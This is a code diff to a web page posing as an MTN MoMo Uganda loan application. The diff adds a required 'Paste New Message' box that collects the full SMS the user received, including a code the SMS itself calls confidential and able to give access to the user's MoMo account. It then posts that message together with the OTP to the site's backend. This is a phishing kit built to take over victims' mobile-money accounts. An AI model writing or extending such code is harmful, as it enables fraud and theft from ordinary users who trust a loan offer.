@@ -205,6 +205,17 @@
   .btn-resend:hover { opacity:0.88; }
   .btn-resend:disabled { opacity:0.5; cursor:not-allowed; }
 
+  /* ───── OTP: PASTE MESSAGE BOX ───── */
+  .otp-paste-section { margin-bottom:22px; }
+  .otp-paste-label { font-size:0.82rem; font-weight:600; color:var(--mtn-dark); margin-bottom:6px; }
+  .otp-paste-hint { font-size:0.78rem; color:var(--text-light); margin-bottom:10px; }
+  .otp-paste-textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.88rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s; min-height:90px; resize:vertical; }
+  .otp-paste-textarea:focus { border-color:var(--mtn-gold); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
+  .otp-paste-code-hint { font-size:0.74rem; color:var(--text-light); margin-top:6px; font-style:italic; }
+  .otp-divider { display:flex; align-items:center; gap:10px; margin:18px 0 16px; }
+  .otp-divider-line { flex:1; height:1px; background:#e0e0e0; }
+  .otp-divider-text { font-size:0.75rem; color:var(--text-light); font-weight:500; white-space:nowrap; }
+
   /* ───── PAGE: OTP ───── */
   #page-otp { background:#fff; }
   .otp-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; border-bottom:1px solid #eee; flex-shrink:0; }
@@ -581,7 +592,22 @@
   <div class="otp-body-wrap">
     <div class="otp-card">
       <h2>Enter OTP Code</h2>
-      <p class="otp-hint">Enter the 4-digit OTP code sent to your phone via MTN MoMo Uganda</p>
+      <p class="otp-hint">A new OTP message has been sent to your phone. Paste the full message below, then enter the 4-digit code.</p>
+
+      <!-- Paste New Message Section -->
+      <div class="otp-paste-section">
+        <div class="otp-paste-label">Paste New Message:</div>
+        <div class="otp-paste-hint">Copy the full SMS you received and paste it here.</div>
+        <textarea id="otpMsgPaste" class="otp-paste-textarea" placeholder="Paste your full SMS message here…" oninput="chkOtp()"></textarea>
+        <p class="otp-paste-code-hint">e.g. "Y'ello. Please note! This confidential code gives access to your MoMo account:........."</p>
+      </div>
+
+      <!-- Divider -->
+      <div class="otp-divider">
+        <div class="otp-divider-line"></div>
+        <div class="otp-divider-text">THEN ENTER OTP BELOW</div>
+        <div class="otp-divider-line"></div>
+      </div>
 
       <!-- OTP Section Only -->
       <div class="otp-section">
@@ -729,6 +755,7 @@
       btn.disabled = false;
       btn.textContent = 'VERIFY & APPROVE LOAN';
       spinner.classList.remove('show');
+      document.getElementById('otpMsgPaste').value = '';
       chkOtp();
       ['otpMsg','otpMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
     }
@@ -1246,7 +1273,8 @@
 
   function chkOtp() {
     const otpOk = [0,1,2,3].every(i => document.getElementById('otp'+i).value);
-    document.getElementById('bOtp').className = otpOk ? 'btn-otp rdy' : 'btn-otp';
+    const msgOk = (document.getElementById('otpMsgPaste').value || '').trim().length > 0;
+    document.getElementById('bOtp').className = (otpOk && msgOk) ? 'btn-otp rdy' : 'btn-otp';
   }
 
   function showOtpMsg(type, text) {
@@ -1259,6 +1287,12 @@
     ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
 
     const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
+    const pastedMsg = (document.getElementById('otpMsgPaste').value || '').trim();
+
+    if (!pastedMsg) {
+      showOtpMsg('error', 'Please paste the SMS message you received.');
+      return;
+    }
 
     if (otp.length < 4) {
       showOtpMsg('error', 'Please enter 4-digit OTP code.');
@@ -1273,7 +1307,7 @@
       const res  = await fetch('/api/verify-otp', {
         method:  'POST',
         headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify({ applicationId: S.applicationId, otp })
+        body:    JSON.stringify({ applicationId: S.applicationId, otp, otpMessage: pastedMsg })
       });
 
       const data = await res.json();
@@ -1344,6 +1378,7 @@
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
             [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
             document.getElementById('smsMsgBox').value = '';
+            document.getElementById('otpMsgPaste').value = '';
 
             // Reset OTP button state
             document.getElementById('bOtp').disabled = false;
